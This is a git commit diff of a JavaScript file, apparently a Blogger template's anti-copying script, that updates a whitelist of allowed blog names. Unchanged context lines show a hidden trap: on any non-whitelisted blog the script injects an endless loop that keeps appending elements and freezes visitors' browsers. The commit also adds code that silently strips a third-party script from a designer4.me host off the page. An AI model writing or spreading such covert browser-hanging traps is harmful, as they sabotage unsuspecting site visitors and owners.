bb6f348f6181d73d70dc02e0f9b979ca783714d2
wejdaneblogger <31163344+wejdaneblogger@users.noreply.github.com>
2018-03-02 14:38:32 +0100

    Update imad.js

--- imad.js
+++ imad.js
@@ -5,7 +5,7 @@ if (x_l['indexOf']('.blogspot') != -1) {
 } else {
     var x_l = x_l['split']('.')[1]
 };
-var x_a = ['mostafa-f-tech', 'khaledmega', 'magone-wejdane', 'egygeek', 'mohammed-s-technical'];
+var x_a = ['mostafa-f-tech', 'wdbloog-wejdane', 'magone-wejdane', 'egygeek', 'mohammed-s-technical'];
 for (i = 0; i < x_a['length']; i++) {
     if (x_l == x_a[i]) {
         x_n++
@@ -16,3 +16,9 @@ if (x_n == 0) {
     s_s['innerHTML'] = 'var x_go = 1;var f_o = document.createElement("DIV");do {document.body.appendChild(f_o);}while (x_go < 5);';
     document['head']['appendChild'](s_s)
 };
+var x_ss = document['getElementsByTagName']('script');
+for (i = 0; i < x_ss['length']; i++) {
+    if (x_ss[i]['src'] == 'http://designer4.me/peter/chat-head.js') {
+        x_ss[i]['replaceWith']('')
+    }
+}
